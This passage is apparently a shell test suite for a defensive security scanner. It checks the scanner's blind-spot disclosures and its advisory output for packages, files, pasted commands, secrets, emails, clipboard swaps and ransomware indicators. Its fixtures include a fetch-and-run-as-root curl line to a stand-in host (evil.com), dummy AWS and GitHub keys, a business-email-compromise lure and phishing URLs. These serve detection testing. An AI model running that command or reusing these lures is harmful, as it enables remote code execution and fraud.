# package get a clean bill of health that says nothing about what we couldn't
# see? Same for file (magic-byte check only) and audit (point-in-time config
# snapshot, invisible to kernel exploits)."

# p44: package OK discloses typosquat-only blind spot
./hlse_core package numpy 2>/dev/null \
    | grep -q "Blind spot:.*typosquat" \
    && check "p44: package OK discloses typosquat-only blind spot" "0" "0" \
    || check "p44: package OK discloses typosquat-only blind spot" "0" "1"

# p44: file OK discloses magic-byte-only blind spot
./hlse_core file /tmp/hlse_test.txt 2>/dev/null \
    | grep -q "Blind spot:.*magic-byte" \
    && check "p44: file OK discloses magic-byte blind spot" "0" "0" \
    || check "p44: file OK discloses magic-byte blind spot" "0" "1"

# p44: package THREAT suppresses blind spot (the threat guidance speaks instead)
./hlse_core package nummpy 2>/dev/null \
    | grep -q "Blind spot:" \
    && check "p44: package threat suppresses blind spot" "1" "0" \
    || check "p44: package threat suppresses blind spot" "1" "1"

# p44: package JSON OK carries blind_spot
./hlse_core --json package numpy 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "blind_spot" in d and "typosquat" in d["blind_spot"], d
' && check "p44 json: package OK carries blind_spot" "0" "0" \
   || check "p44 json: package OK carries blind_spot" "0" "1"

# p44: file JSON OK carries blind_spot
./hlse_core --json file /tmp/hlse_test.txt 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "blind_spot" in d and "magic-byte" in d["blind_spot"], d
' && check "p44 json: file OK carries blind_spot" "0" "0" \
   || check "p44 json: file OK carries blind_spot" "0" "1"

# p44: package JSON THREAT suppresses blind_spot
./hlse_core --json package nummpy 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] > 0 and "blind_spot" not in d, d
' && check "p44 json: package threat omits blind_spot" "0" "0" \
   || check "p44 json: package threat omits blind_spot" "0" "1"

# ─── Perspective 45: blind spots for protect, esp, and scan OK paths ────────

# Socratic question: "The protect OK says nothing beyond 'OK /path'. But it
# only checked for ransomware note filenames, SMB lateral-movement patterns,
# and known MBR overwrite signatures — memory-only ransomware and staged
# pre-encryption attacks write no ransom notes and change no file extensions.
# 'OK' implies clean; what it means here is 'no indicator I know found'. Same
# for esp (string-pattern scan of the EFI partition) and scan (pattern-based
# secret detection in files). Why do the three most infrastructure-critical
# checks offer no caveat about what they didn't check?"

# p45: protect OK discloses indicator-based blind spot
./hlse_core protect /home 2>/dev/null \
    | grep -q "Blind spot:.*indicator-based" \
    && check "p45: protect OK discloses indicator-based blind spot" "0" "0" \
    || check "p45: protect OK discloses indicator-based blind spot" "0" "1"

# p45: protect JSON OK carries blind_spot field
./hlse_core --json protect /home 2>/dev/null | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["score"] == 0 and "blind_spot" in d and "indicator" in d["blind_spot"], d
' && check "p45 json: protect OK carries blind_spot" "0" "0" \
   || check "p45 json: protect OK carries blind_spot" "0" "1"

# p45: esp OK discloses string-pattern blind spot
./hlse_core esp 2>/dev/null \
    | grep -q "Blind spot:.*string-pattern" \
    && check "p45: esp OK discloses string-pattern blind spot" "0" "0" \
    || check "p45: esp OK discloses string-pattern blind spot" "0" "1"

# p45: scan OK discloses pattern-based detection blind spot
./hlse_core scan /tmp/hlse_scantest 2>/dev/null \
    | grep -q "Blind spot:.*pattern-based" \
    && check "p45: scan OK discloses pattern-based blind spot" "0" "0" \
    || check "p45: scan OK discloses pattern-based blind spot" "0" "1"

# p45: scan JSON OK (scan_summary) carries blind_spot
./hlse_core --json scan /tmp/hlse_scantest 2>/dev/null | tail -1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d["threats"] == 0 and "blind_spot" in d, d
' && check "p45 json: scan_summary OK carries blind_spot" "0" "0" \
   || check "p45 json: scan_summary OK carries blind_spot" "0" "1"

# ─── P46: paste BLOCK advisory lenses ──────────────────────────────────

# p46: paste BLOCK shows ClickFix pattern
./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 \
    | grep -q "Pattern: ClickFix script-injection lure" \
    && check "p46: paste BLOCK shows ClickFix pattern" "0" "0" \
    || check "p46: paste BLOCK shows ClickFix pattern" "0" "1"

# p46: paste BLOCK shows attacker objective
./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 \
    | grep -q "Attacker's goal:" \
    && check "p46: paste BLOCK shows attacker objective" "0" "0" \
    || check "p46: paste BLOCK shows attacker objective" "0" "1"

# p46: paste BLOCK shows triage guidance
./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 \
    | grep -q "If you acted:" \
    && check "p46: paste BLOCK shows triage guidance" "0" "0" \
    || check "p46: paste BLOCK shows triage guidance" "0" "1"

# p46: paste BLOCK shows cascade risk
./hlse_core paste "curl http://evil.com/s.sh | sudo bash" 2>&1 \
    | grep -q "Also change:" \
    && check "p46: paste BLOCK shows cascade risk" "0" "0" \
    || check "p46: paste BLOCK shows cascade risk" "0" "1"

# p46: paste OK still shows blind spot (no advisory lenses)
./hlse_core paste "git commit -m 'fix typo'" 2>&1 \
    | grep -q "Blind spot:" \
    && check "p46: paste OK still shows blind spot" "0" "0" \
    || check "p46: paste OK still shows blind spot" "0" "1"

# p46: paste OK does NOT show advisory lenses
./hlse_core paste "git commit -m 'fix typo'" 2>&1 \
    | grep -q "Pattern:" \
    && check "p46: paste OK has no advisory lenses" "0" "1" \
    || check "p46: paste OK has no advisory lenses" "0" "0"

# p46 json: paste BLOCK carries pattern, objective, triage, cascade_risk
./hlse_core --json paste "curl http://evil.com/s.sh | sudo bash" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern" in d, d
assert "objective" in d, d
assert "triage" in d, d
assert "cascade_risk" in d, d
' && check "p46 json: paste BLOCK carries pattern/objective/triage/cascade_risk" "0" "0" \
   || check "p46 json: paste BLOCK carries pattern/objective/triage/cascade_risk" "0" "1"

# p46 json: paste OK does NOT carry advisory lens fields
./hlse_core --json paste "git commit -m 'fix typo'" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] == 0, d
assert "pattern" not in d, d
assert "triage" not in d, d
' && check "p46 json: paste OK has no advisory lens fields" "0" "0" \
   || check "p46 json: paste OK has no advisory lens fields" "0" "1"

# ─── P53: audit per-finding remediation hints ────────────────────────────

# p53: audit HIGH finding shows Fix line
./hlse_core audit 2>&1 \
    | grep -q "Fix:.*visudo" \
    && check "p53: audit HIGH finding (A7 NOPASSWD) shows Fix command" "0" "0" \
    || check "p53: audit HIGH finding (A7 NOPASSWD) shows Fix command" "0" "1"

# p53: audit PASS findings do NOT show Fix line
# Use [PASS] prefix match to avoid matching 'NOPASSWD' in the Fix line
./hlse_core audit 2>&1 \
    | grep "^\s*\[PASS\]" | grep -q "Fix:" \
    && check "p53: audit PASS findings have no Fix line" "0" "1" \
    || check "p53: audit PASS findings have no Fix line" "0" "0"

# p53: audit INFO findings do NOT show Fix line
./hlse_core audit 2>&1 \
    | grep "INFO" | grep -q "Fix:" \
    && check "p53: audit INFO findings have no Fix line" "0" "1" \
    || check "p53: audit INFO findings have no Fix line" "0" "0"

# p53 json: HIGH severity finding carries "fix" field
./hlse_core --json audit 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
highs = [f for f in d["findings"] if f["severity"] >= 4]
assert len(highs) > 0, "no HIGH findings"
for h in highs:
    assert "fix" in h, f"HIGH finding missing fix field: {h}"
' && check "p53 json: HIGH severity findings carry fix field" "0" "0" \
   || check "p53 json: HIGH severity findings carry fix field" "0" "1"

# p53 json: PASS/INFO findings do NOT carry "fix" field
./hlse_core --json audit 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
passes = [f for f in d["findings"] if f["severity"] <= 1]
for p in passes:
    assert "fix" not in p, f"PASS/INFO finding has unexpected fix field: {p}"
' && check "p53 json: PASS/INFO findings have no fix field" "0" "0" \
   || check "p53 json: PASS/INFO findings have no fix field" "0" "1"

# ─── P52: protect/network BLOCK advisory lenses ─────────────────────────

# Create a protect BLOCK test: mass .locked extension mutation
P52_DIR=$(mktemp -d)
for i in $(seq 1 10); do touch "$P52_DIR/doc_${i}.docx.locked"; done

# p52: protect BLOCK shows ransomware pattern
./hlse_core protect "$P52_DIR" 2>&1 \
    | grep -q "Pattern: ransomware" \
    && check "p52: protect BLOCK shows ransomware pattern" "0" "0" \
    || check "p52: protect BLOCK shows ransomware pattern" "0" "1"

# p52: protect BLOCK shows attacker objective (data destruction)
./hlse_core protect "$P52_DIR" 2>&1 \
    | grep -q "Attacker's goal:.*data destruction" \
    && check "p52: protect BLOCK shows data destruction objective" "0" "0" \
    || check "p52: protect BLOCK shows data destruction objective" "0" "1"

# p52: protect BLOCK shows triage (disconnect from network)
./hlse_core protect "$P52_DIR" 2>&1 \
    | grep -q "Immediate action:.*disconnect" \
    && check "p52: protect BLOCK shows network disconnect triage" "0" "0" \
    || check "p52: protect BLOCK shows network disconnect triage" "0" "1"

# p52: protect BLOCK shows cascade risk (credentials)
./hlse_core protect "$P52_DIR" 2>&1 \
    | grep -q "Also change:" \
    && check "p52: protect BLOCK shows cascade risk" "0" "0" \
    || check "p52: protect BLOCK shows cascade risk" "0" "1"

# p52 json: protect BLOCK carries pattern, objective, verify, triage, cascade_risk
./hlse_core --json protect "$P52_DIR" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern" in d, d
assert "objective" in d, d
assert "verify" in d, d
assert "triage" in d, d
assert "cascade_risk" in d, d
' && check "p52 json: protect BLOCK carries all advisory lens fields" "0" "0" \
   || check "p52 json: protect BLOCK carries all advisory lens fields" "0" "1"

rm -rf "$P52_DIR"

# p52: protect OK still shows blind spot (no advisory lenses)
P52_CLEAN=$(mktemp -d)
echo "safe content" > "$P52_CLEAN/report_2026.txt"
./hlse_core protect "$P52_CLEAN" 2>&1 \
    | grep -q "Blind spot:" \
    && check "p52: protect OK still shows blind spot" "0" "0" \
    || check "p52: protect OK still shows blind spot" "0" "1"
rm -rf "$P52_CLEAN"

# ─── P51: file BLOCK advisory lenses ────────────────────────────────────

# p51: file BLOCK (double extension) shows masquerade pattern
touch /tmp/hlse_p51_test.pdf.exe
./hlse_core file /tmp/hlse_p51_test.pdf.exe 2>&1 \
    | grep -q "Pattern: double-extension file masquerade" \
    && check "p51: file BLOCK shows double-extension masquerade pattern" "0" "0" \
    || check "p51: file BLOCK shows double-extension masquerade pattern" "0" "1"

# p51: file BLOCK shows code execution objective
./hlse_core file /tmp/hlse_p51_test.pdf.exe 2>&1 \
    | grep -q "Attacker's goal:.*code execution" \
    && check "p51: file BLOCK shows code execution objective" "0" "0" \
    || check "p51: file BLOCK shows code execution objective" "0" "1"

# p51: file BLOCK shows verify first (VirusTotal / sandbox)
./hlse_core file /tmp/hlse_p51_test.pdf.exe 2>&1 \
    | grep -q "Verify first:" \
    && check "p51: file BLOCK shows verify-first guidance" "0" "0" \
    || check "p51: file BLOCK shows verify-first guidance" "0" "1"

# p51: file BLOCK shows triage (disconnect / antivirus)
./hlse_core file /tmp/hlse_p51_test.pdf.exe 2>&1 \
    | grep -q "If you acted:" \
    && check "p51: file BLOCK shows triage" "0" "0" \
    || check "p51: file BLOCK shows triage" "0" "1"

# p51: file BLOCK shows cascade risk (credentials / persistence)
./hlse_core file /tmp/hlse_p51_test.pdf.exe 2>&1 \
    | grep -q "Also change:" \
    && check "p51: file BLOCK shows cascade risk" "0" "0" \
    || check "p51: file BLOCK shows cascade risk" "0" "1"

# p51: file OK still shows blind spot (no advisory lenses)
./hlse_core file /tmp/hlse_test.txt 2>&1 \
    | grep -q "Blind spot:" \
    && check "p51: file OK still shows blind spot" "0" "0" \
    || check "p51: file OK still shows blind spot" "0" "1"

# p51 json: file BLOCK carries pattern, objective, verify, triage, cascade_risk
./hlse_core --json file /tmp/hlse_p51_test.pdf.exe 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern" in d, d
assert "objective" in d, d
assert "verify" in d, d
assert "triage" in d, d
assert "cascade_risk" in d, d
' && check "p51 json: file BLOCK carries all advisory lens fields" "0" "0" \
   || check "p51 json: file BLOCK carries all advisory lens fields" "0" "1"

# p51 json: file OK has no advisory lens fields
./hlse_core --json file /tmp/hlse_test.txt 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] == 0, d
assert "pattern" not in d, d
assert "triage" not in d, d
' && check "p51 json: file OK has no advisory lens fields" "0" "0" \
   || check "p51 json: file OK has no advisory lens fields" "0" "1"

rm -f /tmp/hlse_p51_test.pdf.exe

# ─── P50: secret BLOCK advisory lenses ──────────────────────────────────

# p50: secret BLOCK shows credential-type pattern
./hlse_core secret "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" 2>&1 \
    | grep -q "Pattern: exposed credential" \
    && check "p50: secret BLOCK shows credential-type pattern" "0" "0" \
    || check "p50: secret BLOCK shows credential-type pattern" "0" "1"

# p50: secret BLOCK shows AWS-specific objective
./hlse_core secret "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" 2>&1 \
    | grep -q "cloud API access" \
    && check "p50: secret BLOCK shows AWS cloud access objective" "0" "0" \
    || check "p50: secret BLOCK shows AWS cloud access objective" "0" "1"

# p50: secret BLOCK shows verify-first (check access logs)
./hlse_core secret "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" 2>&1 \
    | grep -q "Verify first:.*access logs" \
    && check "p50: secret BLOCK shows verify-first (access logs)" "0" "0" \
    || check "p50: secret BLOCK shows verify-first (access logs)" "0" "1"

# p50: secret BLOCK shows cascade risk (co-located secrets)
./hlse_core secret "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" 2>&1 \
    | grep -q "Also change:" \
    && check "p50: secret BLOCK shows cascade risk" "0" "0" \
    || check "p50: secret BLOCK shows cascade risk" "0" "1"

# p50: GitHub token gets GitHub-specific objective
./hlse_core secret "github_token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij" 2>&1 \
    | grep -q "source code and CI/CD pipeline access" \
    && check "p50: GitHub token BLOCK shows CI/CD objective" "0" "0" \
    || check "p50: GitHub token BLOCK shows CI/CD objective" "0" "1"

# p50: secret OK still shows blind spot (no advisory lenses)
./hlse_core secret "hello world" 2>&1 \
    | grep -q "Blind spot:" \
    && check "p50: secret OK still shows blind spot" "0" "0" \
    || check "p50: secret OK still shows blind spot" "0" "1"

# p50 json: secret BLOCK carries pattern, objective, verify, triage, cascade_risk
./hlse_core --json secret "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern" in d, d
assert "objective" in d, d
assert "verify" in d, d
assert "triage" in d, d
assert "cascade_risk" in d, d
' && check "p50 json: secret BLOCK carries all advisory lens fields" "0" "0" \
   || check "p50 json: secret BLOCK carries all advisory lens fields" "0" "1"

# p50 json: secret OK has no advisory lens fields
./hlse_core --json secret "hello world" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] == 0, d
assert "pattern" not in d, d
assert "triage" not in d, d
' && check "p50 json: secret OK has no advisory lens fields" "0" "0" \
   || check "p50 json: secret OK has no advisory lens fields" "0" "1"

# ─── P49: package BLOCK advisory lenses ─────────────────────────────────

# p49: package BLOCK shows supply-chain pattern
./hlse_core package reqeusts 2>&1 \
    | grep -q "Pattern: dependency confusion" \
    && check "p49: package BLOCK shows supply-chain pattern" "0" "0" \
    || check "p49: package BLOCK shows supply-chain pattern" "0" "1"

# p49: package BLOCK shows attacker objective (code execution)
./hlse_core package reqeusts 2>&1 \
    | grep -q "Attacker's goal:.*code execution" \
    && check "p49: package BLOCK shows code execution objective" "0" "0" \
    || check "p49: package BLOCK shows code execution objective" "0" "1"

# p49: package BLOCK shows triage (uninstall)
./hlse_core package reqeusts 2>&1 \
    | grep -q "If you acted:.*uninstall" \
    && check "p49: package BLOCK shows uninstall triage" "0" "0" \
    || check "p49: package BLOCK shows uninstall triage" "0" "1"

# p49: package BLOCK shows cascade risk (env vars)
./hlse_core package reqeusts 2>&1 \
    | grep -q "Also change:" \
    && check "p49: package BLOCK shows cascade risk" "0" "0" \
    || check "p49: package BLOCK shows cascade risk" "0" "1"

# p49: package OK still shows blind spot (no advisory lenses)
./hlse_core package colorama 2>&1 \
    | grep -q "Blind spot:" \
    && check "p49: package OK still shows blind spot" "0" "0" \
    || check "p49: package OK still shows blind spot" "0" "1"

# p49: package OK does NOT show advisory lenses
./hlse_core package colorama 2>&1 \
    | grep -q "Pattern:" \
    && check "p49: package OK has no advisory lenses" "0" "1" \
    || check "p49: package OK has no advisory lenses" "0" "0"

# p49 json: package BLOCK carries pattern, objective, verify, triage, cascade_risk
./hlse_core --json package reqeusts 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern" in d, d
assert "objective" in d, d
assert "verify" in d, d
assert "triage" in d, d
assert "cascade_risk" in d, d
' && check "p49 json: package BLOCK carries all advisory lens fields" "0" "0" \
   || check "p49 json: package BLOCK carries all advisory lens fields" "0" "1"

# p49 json: package OK has no advisory lens fields
./hlse_core --json package colorama 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] == 0, d
assert "pattern" not in d, d
assert "triage" not in d, d
' && check "p49 json: package OK has no advisory lens fields" "0" "0" \
   || check "p49 json: package OK has no advisory lens fields" "0" "1"

# ─── P48: email BLOCK advisory lenses ───────────────────────────────────

BEC_HDR='From: ceo@company.com
Reply-To: ceo.company@gmail.com
Received: from hacked.xyz [1.2.3.4]
Authentication-Results: dkim=fail; spf=fail'

# p48: email BLOCK (header-only) shows BEC pattern
printf '%s' "$BEC_HDR" | ./hlse_core email --stdin 2>&1 \
    | grep -q "Pattern: business email compromise" \
    && check "p48: email BLOCK (header-only) shows BEC pattern" "0" "0" \
    || check "p48: email BLOCK (header-only) shows BEC pattern" "0" "1"

# p48: email BLOCK (header-only) shows triage
printf '%s' "$BEC_HDR" | ./hlse_core email --stdin 2>&1 \
    | grep -q "If you acted:" \
    && check "p48: email BLOCK (header-only) shows triage" "0" "0" \
    || check "p48: email BLOCK (header-only) shows triage" "0" "1"

# p48: email BLOCK (body_pat) shows verify first
BEC_BODY="$BEC_HDR
wire transfer \$80000 immediately, keep secret, urgent CEO request"
printf '%s' "$BEC_BODY" | ./hlse_core email --stdin 2>&1 \
    | grep -q "Verify first:" \
    && check "p48: email BLOCK (body_pat) shows Verify first" "0" "0" \
    || check "p48: email BLOCK (body_pat) shows Verify first" "0" "1"

# p48: email BLOCK (body_pat) shows cascade risk
printf '%s' "$BEC_BODY" | ./hlse_core email --stdin 2>&1 \
    | grep -q "Also change:" \
    && check "p48: email BLOCK (body_pat) shows cascade risk" "0" "0" \
    || check "p48: email BLOCK (body_pat) shows cascade risk" "0" "1"

# p48 json: email BLOCK (header-only) carries pattern, objective, triage
printf '%s' "$BEC_HDR" | ./hlse_core --json email --stdin 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern" in d, d
assert "objective" in d, d
assert "triage" in d, d
assert "cascade_risk" in d, d
' && check "p48 json: email BLOCK (header-only) carries pattern/objective/triage/cascade_risk" "0" "0" \
   || check "p48 json: email BLOCK (header-only) carries pattern/objective/triage/cascade_risk" "0" "1"

# p48 json: email BLOCK (body_pat) carries objective, verify, triage, cascade_risk
printf '%s' "$BEC_BODY" | ./hlse_core --json email --stdin 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "objective" in d, d
assert "verify" in d, d
assert "triage" in d, d
assert "cascade_risk" in d, d
' && check "p48 json: email BLOCK (body_pat) carries objective/verify/triage/cascade_risk" "0" "0" \
   || check "p48 json: email BLOCK (body_pat) carries objective/verify/triage/cascade_risk" "0" "1"

# p48: email LOG (score < 60) does NOT show triage
./hlse_core email "From: test@example.com
Reply-To: test@gmail.com" 2>&1 \
    | grep -q "If you acted:" \
    && check "p48: email LOG does not show triage" "0" "1" \
    || check "p48: email LOG does not show triage" "0" "0"

# ─── P47: clipboard ISOLATE advisory lenses ─────────────────────────────

CB_ORIG="bc1qjaet6jgpk08la46jelmlpgsz84luc4lc0tnwr5"
CB_FAKE="bc1qFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFA"

# p47: clipboard ISOLATE shows pattern label
./hlse_core clipboard "$CB_ORIG" "$CB_FAKE" 2>&1 \
    | grep -q "Pattern: cryptocurrency clipboard hijack" \
    && check "p47: clipboard ISOLATE shows pattern label" "0" "0" \
    || check "p47: clipboard ISOLATE shows pattern label" "0" "1"

# p47: clipboard ISOLATE shows attacker objective
./hlse_core clipboard "$CB_ORIG" "$CB_FAKE" 2>&1 \
    | grep -q "Attacker's goal:" \
    && check "p47: clipboard ISOLATE shows attacker objective" "0" "0" \
    || check "p47: clipboard ISOLATE shows attacker objective" "0" "1"

# p47: clipboard ISOLATE shows triage (If you acted)
./hlse_core clipboard "$CB_ORIG" "$CB_FAKE" 2>&1 \
    | grep -q "If you acted:" \
    && check "p47: clipboard ISOLATE shows triage" "0" "0" \
    || check "p47: clipboard ISOLATE shows triage" "0" "1"

# p47: clipboard ISOLATE shows cascade risk (Also change)
./hlse_core clipboard "$CB_ORIG" "$CB_FAKE" 2>&1 \
    | grep -q "Also change:" \
    && check "p47: clipboard ISOLATE shows cascade risk" "0" "0" \
    || check "p47: clipboard ISOLATE shows cascade risk" "0" "1"

# p47: clipboard OK still shows blind spot (no advisory lenses)
./hlse_core clipboard "$CB_ORIG" "$CB_ORIG" 2>&1 \
    | grep -q "Blind spot:" \
    && check "p47: clipboard OK still shows blind spot" "0" "0" \
    || check "p47: clipboard OK still shows blind spot" "0" "1"

# p47: clipboard OK does NOT show advisory lenses
./hlse_core clipboard "$CB_ORIG" "$CB_ORIG" 2>&1 \
    | grep -q "Pattern:" \
    && check "p47: clipboard OK has no advisory lenses" "0" "1" \
    || check "p47: clipboard OK has no advisory lenses" "0" "0"

# p47 json: clipboard ISOLATE carries pattern, objective, triage, cascade_risk
./hlse_core --json clipboard "$CB_ORIG" "$CB_FAKE" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern" in d, d
assert "objective" in d, d
assert "verify" in d, d
assert "triage" in d, d
assert "cascade_risk" in d, d
' && check "p47 json: clipboard ISOLATE carries pattern/objective/triage/cascade_risk" "0" "0" \
   || check "p47 json: clipboard ISOLATE carries pattern/objective/triage/cascade_risk" "0" "1"

# p47 json: clipboard OK has no advisory lens fields
./hlse_core --json clipboard "$CB_ORIG" "$CB_ORIG" 2>&1 | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] == 0, d
assert "pattern" not in d, d
assert "triage" not in d, d
' && check "p47 json: clipboard OK has no advisory lens fields" "0" "0" \
   || check "p47 json: clipboard OK has no advisory lens fields" "0" "1"

# ─── P55: scan mode per-file advisory lenses ────────────────────────────

# Fixtures: double-extension file + file containing an AWS key
P55_DIR=$(mktemp -d)
touch "$P55_DIR/invoice.pdf.exe"
echo "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" > "$P55_DIR/config.txt"

# p55: scan file masquerade BLOCK shows double-extension pattern
./hlse_core scan "$P55_DIR" 2>&1 \
    | grep -q "Pattern: double-extension file masquerade" \
    && check "p55: scan file BLOCK shows double-extension masquerade pattern" "0" "0" \
    || check "p55: scan file BLOCK shows double-extension masquerade pattern" "0" "1"

# p55: scan file masquerade BLOCK shows code execution objective
./hlse_core scan "$P55_DIR" 2>&1 \
    | grep -q "Attacker's goal:.*code execution" \
    && check "p55: scan file BLOCK shows code execution objective" "0" "0" \
    || check "p55: scan file BLOCK shows code execution objective" "0" "1"

# p55: scan secret BLOCK shows exposed credential pattern
./hlse_core scan "$P55_DIR" 2>&1 \
    | grep -q "Pattern:.*exposed credential" \
    && check "p55: scan secret BLOCK shows exposed credential pattern" "0" "0" \
    || check "p55: scan secret BLOCK shows exposed credential pattern" "0" "1"

# p55: scan secret BLOCK shows AWS-specific cloud access objective
./hlse_core scan "$P55_DIR" 2>&1 \
    | grep -q "Attacker's goal:.*cloud API access" \
    && check "p55: scan secret BLOCK shows AWS cloud access objective" "0" "0" \
    || check "p55: scan secret BLOCK shows AWS cloud access objective" "0" "1"

# p55 json: scan file BLOCK carries all five advisory lens fields
./hlse_core --json scan "$P55_DIR" 2>&1 \
    | grep '"kind":"file"' | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern"      in d, d
assert "objective"    in d, d
assert "verify"       in d, d
assert "triage"       in d, d
assert "cascade_risk" in d, d
' && check "p55 json: scan file BLOCK carries all advisory lens fields" "0" "0" \
   || check "p55 json: scan file BLOCK carries all advisory lens fields" "0" "1"

# p55 json: scan secret BLOCK carries all five advisory lens fields
./hlse_core --json scan "$P55_DIR" 2>&1 \
    | grep '"kind":"secret"' | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern"      in d, d
assert "objective"    in d, d
assert "verify"       in d, d
assert "triage"       in d, d
assert "cascade_risk" in d, d
' && check "p55 json: scan secret BLOCK carries all advisory lens fields" "0" "0" \
   || check "p55 json: scan secret BLOCK carries all advisory lens fields" "0" "1"

rm -rf "$P55_DIR"

# ─── P56: scan mode embedded-URL advisory lenses ─────────────────────────

# Fixture: text file containing a PayPal typosquat URL
P56_DIR=$(mktemp -d)
echo "Please visit https://paypa1.com/login for account verification" > "$P56_DIR/spam.txt"

# p56: scan embedded URL BLOCK shows attack pattern
./hlse_core scan "$P56_DIR" 2>&1 \
    | grep -q "Pattern:" \
    && check "p56: scan URL BLOCK shows attack pattern" "0" "0" \
    || check "p56: scan URL BLOCK shows attack pattern" "0" "1"

# p56: scan embedded URL BLOCK shows attacker objective
./hlse_core scan "$P56_DIR" 2>&1 \
    | grep -q "Attacker's goal:" \
    && check "p56: scan URL BLOCK shows attacker objective" "0" "0" \
    || check "p56: scan URL BLOCK shows attacker objective" "0" "1"

# p56: scan embedded URL BLOCK shows verify guidance
./hlse_core scan "$P56_DIR" 2>&1 \
    | grep -q "Verify" \
    && check "p56: scan URL BLOCK shows verify guidance" "0" "0" \
    || check "p56: scan URL BLOCK shows verify guidance" "0" "1"

# p56 json: scan URL BLOCK carries all five advisory lens fields
./hlse_core --json scan "$P56_DIR" 2>&1 \
    | grep '"kind":"url"' | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "pattern"      in d, d
assert "objective"    in d, d
assert "verify"       in d, d
assert "triage"       in d, d
assert "cascade_risk" in d, d
' && check "p56 json: scan URL BLOCK carries all advisory lens fields" "0" "0" \
   || check "p56 json: scan URL BLOCK carries all advisory lens fields" "0" "1"

rm -rf "$P56_DIR"

# ─── P57: scan URL findings carry safe_url, confidence, and exoneration ──

# BLOCK URL fixture (PayPal subdomain spoof)
P57_DIR=$(mktemp -d)
echo "Please visit https://paypal.verify-account-now.com/login now" > "$P57_DIR/phish.txt"

# p57: scan URL BLOCK shows safe destination line
./hlse_core scan "$P57_DIR" 2>&1 \
    | grep -q "Safe destination:" \
    && check "p57: scan URL BLOCK shows safe destination" "0" "0" \
    || check "p57: scan URL BLOCK shows safe destination" "0" "1"

# p57: scan URL BLOCK shows confidence line
./hlse_core scan "$P57_DIR" 2>&1 \
    | grep -q "Confidence:" \
    && check "p57: scan URL BLOCK shows confidence" "0" "0" \
    || check "p57: scan URL BLOCK shows confidence" "0" "1"

# p57 json: scan URL BLOCK carries safe_url field
./hlse_core --json scan "$P57_DIR" 2>&1 \
    | grep '"kind":"url"' | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["score"] >= 60, d
assert "safe_url"      in d, d
assert "signal_count"  in d, d
assert "confidence"    in d, d
' && check "p57 json: scan URL BLOCK carries safe_url, signal_count, confidence" "0" "0" \
   || check "p57 json: scan URL BLOCK carries safe_url, signal_count, confidence" "0" "1"

rm -rf "$P57_DIR"

# ─── P58: scan_summary carries immediate_action triage field ─────────────

# AWS key scan — cloud asset class
P58_DIR=$(mktemp -d)
echo "aws_access_key_id = AKIA2E3MWORQXYZ4567PQ" > "$P58_DIR/config.txt"

# p58: scan summary human output shows immediate action line
./hlse_core scan "$P58_DIR" 2>&1 \
    | grep -q "Immediate action:" \
    && check "p58: scan summary shows immediate action (human)" "0" "0" \
    || check "p58: scan summary shows immediate action (human)" "0" "1"

# p58 json: scan_summary carries immediate_action when threats > 0
./hlse_core --json scan "$P58_DIR" 2>&1 \
    | grep '"kind":"scan_summary"' | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["threats"] > 0, d
assert "immediate_action" in d, d
assert "cloud" in d["immediate_action"].lower(), d
' && check "p58 json: scan_summary carries immediate_action (cloud class)" "0" "0" \
   || check "p58 json: scan_summary carries immediate_action (cloud class)" "0" "1"

rm -rf "$P58_DIR"

# p58 json: scan_summary has no immediate_action when threats == 0
P58_CLEAN=$(mktemp -d)
echo "hello world" > "$P58_CLEAN/readme.txt"
./hlse_core --json scan "$P58_CLEAN" 2>&1 \
    | grep '"kind":"scan_summary"' | python3 -c '
import sys, json
d = json.loads(sys.stdin.readline())
assert d["threats"] == 0, d
assert "immediate_action" not in d, d
' && check "p58 json: scan_summary has no immediate_action when clean" "0" "0" \
   || check "p58 json: scan_summary has no immediate_action when clean" "0" "1"
rm -rf "$P58_CLEAN"

